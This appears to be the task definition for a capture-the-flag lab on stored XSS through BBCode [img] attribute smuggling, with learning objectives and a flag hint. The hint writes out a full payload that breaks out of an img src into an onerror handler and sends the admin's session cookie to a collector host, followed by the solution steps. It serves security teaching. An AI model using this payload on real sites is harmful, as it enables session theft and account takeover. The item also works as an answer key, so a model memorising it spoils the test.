title: Stored XSS via BBCode [img] Attribute Smuggling
learning_objectives: Recognise HTML-attribute context as distinct from element context: escaping < and > is not enough when a value lands inside an attribute value
Exploit a markup renderer that HTML-escapes surrounding text but inserts a captured URL raw into a src attribute, letting a double quote break out into new attributes
Craft an [img] attribute-smuggling payload that opens an onerror handler which fires on image load — no click or submit required
Understand the stored, attacker != victim shape: you post a topic; the admin bot renders it on a page you cannot load yourself
Exfiltrate the admin's non-HttpOnly session cookie to an OOB collector and identify HTML-attribute encoding as the root fix
flag_hint: POST /topics {"body":"[img]x\" onerror=\"new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)\"[/img]"}; the raw [img] URL breaks out of src into an onerror that fires when the admin bot renders GET /admin/topics. Read the exfiltrated cookie via GET /oob/received, then POST /solve {"c":"<32 hex>"}.
inspired_by: Classic phpBB/vBulletin-era BBCode [img] attribute-injection XSS, re-platformed to Flask for local Docker with a Playwright victim bot and an OOB collector
